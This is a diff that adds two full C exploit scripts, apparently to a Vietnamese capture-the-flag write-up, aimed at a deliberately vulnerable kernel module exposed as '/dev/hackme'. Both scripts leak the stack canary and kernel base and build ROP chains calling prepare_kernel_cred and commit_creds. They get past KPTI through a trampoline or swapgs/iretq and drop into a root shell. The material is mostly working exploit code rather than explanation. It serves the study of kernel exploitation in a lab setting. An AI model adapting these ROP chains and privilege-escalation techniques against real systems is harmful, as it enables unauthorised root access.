@@ -248,3 +248,365 @@ void get_shell(void){
     }
 }
 ```
+#### full script
+- script tham khảo
+```c
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+void leak_stack(int, unsigned long *);
+void save_state(void);
+void fetch_commit(void);
+void leak_prep(void);
+void fetch_prep(void);
+void make_cred(void);
+void fetch_cred(void);
+void send_cred(void);
+void getshell(void);
+
+int fetch;
+int fd;
+
+unsigned long user_cs, user_ss, user_sp, user_rflags;
+unsigned long commit_creds, prepare_kcred, ksymtab_commit_creds, ksymtab_prepare_kcred;
+unsigned long canary, image_base;
+unsigned long cred_struct_ptr;
+
+//arbitrary read gadgets
+unsigned long pop_rax; //pop rax ; ret
+unsigned long mov_eax_pop; //mov eax, dword ptr [rax] ; pop rbp ; ret
+
+//other gadgets
+unsigned long kpti_trampoline; //followed by 2 pops
+unsigned long pop_rdi;
+
+int main(void)
+{
+	save_state();
+	
+	fd = open("/dev/hackme", O_RDWR);
+	
+	printf("[+]Leaking Stack...\n");
+	int size = 50;
+	unsigned long buf[size];
+	leak_stack(size, buf);
+
+	canary = buf[16];
+	image_base = buf[38]-0xa157;
+
+	printf("[+]Canary: %lx\n", canary);
+	printf("[+]Image Base: %lx\n", image_base);
+
+
+	pop_rax = image_base + 0x4d11;
+	mov_eax_pop = image_base + 0x15a80;
+	kpti_trampoline = image_base + 0x200f26;
+
+	ksymtab_commit_creds = image_base + 0xf87d90;
+	ksymtab_prepare_kcred = image_base + 0xf8d4fc;
+
+	//leak commit_creds
+	int offset = 16;
+	unsigned long payload[50];
+	payload[offset++] = canary;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = pop_rax;
+	payload[offset++] = ksymtab_commit_creds;
+	payload[offset++] = mov_eax_pop;
+	payload[offset++] = 0;
+	payload[offset++] = kpti_trampoline;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = (unsigned long)fetch_commit;
+	payload[offset++] = user_cs;
+	payload[offset++] = user_rflags;
+	payload[offset++] = user_sp;
+	payload[offset++] = user_ss;
+	write(fd, payload, sizeof(payload));
+
+	return 0;
+}
+
+void leak_stack(int size, unsigned long * buf)
+{
+	read(fd, buf, size*8);
+	for (int i = 0; i < size; i++)
+		printf("[%d]: %lx\n", i, buf[i]);
+}
+
+void save_state(void)
+{
+	__asm__
+	(
+	 	".intel_syntax noprefix;"
+		
+		"mov user_cs, cs;"
+		"mov user_ss, ss;"
+		"mov user_sp, rsp;"
+		"pushf;"
+		"pop user_rflags;"
+
+		".att_syntax;"
+	);
+	printf("[+]State Saved!\n");
+}
+
+void fetch_commit(void)
+{
+	__asm__
+	(
+ 		".intel_syntax noprefix;"
+
+		"mov fetch, eax;"
+		
+		".att_syntax;"
+	);
+	commit_creds = ksymtab_commit_creds + fetch;
+	printf("[+]commit_creds() Leaked: %lx\n", commit_creds);
+
+	leak_prep();
+}
+
+void leak_prep(void)
+{
+	unsigned long payload[50];
+	int offset = 16;
+
+	payload[offset++] = canary;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = pop_rax;
+	payload[offset++] = ksymtab_prepare_kcred;
+	payload[offset++] = mov_eax_pop;
+	payload[offset++] = 0;
+	payload[offset++] = kpti_trampoline;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = (unsigned long)fetch_prep;
+	payload[offset++] = user_cs;
+	payload[offset++] = user_rflags;
+	payload[offset++] = user_sp;
+	payload[offset++] = user_ss;
+
+	write(fd, payload, sizeof(payload));
+}
+
+void fetch_prep(void)
+{
+	__asm__
+	(
+		".intel_syntax noprefix;"
+		
+		"mov fetch, eax;"
+
+		".att_syntax;"
+	);
+	prepare_kcred = ksymtab_prepare_kcred + fetch;
+	printf("[+]prepare_kernel_cred() Leaked: %lx\n", prepare_kcred);
+
+	make_cred();
+}
+
+void make_cred(void)
+{
+	unsigned long payload[50];
+	int offset = 16;
+	pop_rdi = image_base + 0x6370;
+
+	payload[offset++] = canary;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = pop_rdi;
+	payload[offset++] = 0;
+	payload[offset++] = prepare_kcred;
+	payload[offset++] = kpti_trampoline;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = (unsigned long)fetch_cred;
+	payload[offset++] = user_cs;
+	payload[offset++] = user_rflags;
+	payload[offset++] = user_sp;
+	payload[offset++] = user_ss;
+
+	write(fd, payload, sizeof(payload));
+}
+
+void fetch_cred(void)
+{
+	__asm__
+	(
+	 	".intel_syntax noprefix;"
+		
+		"mov cred_struct_ptr, rax;"
+
+		".att_syntax;"
+	);
+	printf("[+]ptr to cred struct retrieved: %lx\n", cred_struct_ptr);
+
+	send_cred();
+}
+
+void send_cred(void)
+{
+	
+	unsigned long payload[50];
+	int offset = 16;
+
+	payload[offset++] = canary;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = pop_rdi;
+	payload[offset++] = cred_struct_ptr;
+	payload[offset++] = commit_creds;
+	payload[offset++] = kpti_trampoline;
+	payload[offset++] = 0;
+	payload[offset++] = 0;
+	payload[offset++] = (unsigned long)getshell;
+	payload[offset++] = user_cs;
+	payload[offset++] = user_rflags;
+	payload[offset++] = user_sp;
+	payload[offset++] = user_ss;
+	
+	write(fd, payload, sizeof(payload));
+}
+
+void getshell(void)
+{
+	if (getuid() == 0)
+	{
+		printf("[+]Exploit Success!\n");
+		system("/bin/sh");
+	}
+	else
+		printf("[-]Exploit Unsuccessful.\n");
+	exit(0);
+}
+```
+- full script
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+
+int fd_ko;
+void open_module()
+{
+    fd_ko = open("/dev/hackme", O_RDWR);
+    if (fd_ko < 0)
+    {
+        printf("open fail");
+        exit(0);
+    }
+}
+long int canary = 0;
+void read_module()
+{
+    long int tmp[0x10 + 5];
+    int check = read(fd_ko, tmp, sizeof(tmp));
+    if (check < 0)
+    {
+        printf("read fail\n");
+        exit(0);
+    }
+    for (int i = 0; i < 0x10 + 5; i++)
+    {
+        printf("hackme[%d]: %lp\n", i, tmp[i]);
+    }
+    canary = tmp[16];
+}
+
+void get_shell(void)
+{
+    puts("[*] Returned to userland");
+    if (getuid() == 0)
+    {
+        printf("[*] UID: %d, got root!\n", getuid());
+        system("/bin/sh");
+    }
+    else
+    {
+        printf("[!] UID: %d, didn't get root\n", getuid());
+        exit(-1);
+    }
+}
+
+unsigned long user_rip = (unsigned long)get_shell + 1;
+
+unsigned long user_cs, user_ss, user_rflags, user_sp;
+
+void save_state()
+{
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov user_cs, cs;"
+        "mov user_ss, ss;"
+        "mov user_sp, rsp;"
+        "pushf;"
+        "pop user_rflags;"
+        ".att_syntax;");
+    puts("[*] Saved state");
+}
+
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long pop_rdx_ret = 0xffffffff81007616;              // pop rdx ; ret
+unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4;     // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+unsigned long commit_creds = 0xffffffff814c6410;
+unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
+unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
+unsigned long iretq = 0xffffffff8100c0d9;
+
+void write_module(void)
+{
+    unsigned n = 50;
+    unsigned long payload[n];
+    unsigned off = 16;
+    payload[off++] = canary;
+    payload[off++] = 0x0;                 // rbx
+    payload[off++] = 0x0;                 // r12
+    payload[off++] = 0x0;                 // rbp
+    payload[off++] = pop_rdi_ret;         // return address
+    payload[off++] = 0x0;                 // rdi <- 0
+    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
+    payload[off++] = pop_rdx_ret;
+    payload[off++] = 0x8;                      // rdx <- 8
+    payload[off++] = cmp_rdx_jne_pop2_ret;     // make sure JNE doesn't branch
+    payload[off++] = 0x0;                      // dummy rbx
+    payload[off++] = 0x0;                      // dummy rbp
+    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
+    payload[off++] = 0x0;                      // dummy rbx
+    payload[off++] = 0x0;                      // dummy rbp
+    payload[off++] = commit_creds;             // commit_creds(prepare_kernel_cred(0))
+    payload[off++] = swapgs_pop1_ret;          // swapgs
+    payload[off++] = 0x0;                      // dummy rbp
+    payload[off++] = iretq;                    // iretq frame
+    payload[off++] = user_rip;
+    payload[off++] = user_cs;
+    payload[off++] = user_rflags;
+    payload[off++] = user_sp;
+    payload[off++] = user_ss;
+
+    puts("[*] Prepared payload");
+    ssize_t w = write(fd_ko, payload, sizeof(payload));
+
+    puts("[!] Should never be reached");
+}
+
+int main()
+{
+    save_state();
+    open_module();
+    read_module();
+    write_module();
+}
+
+```
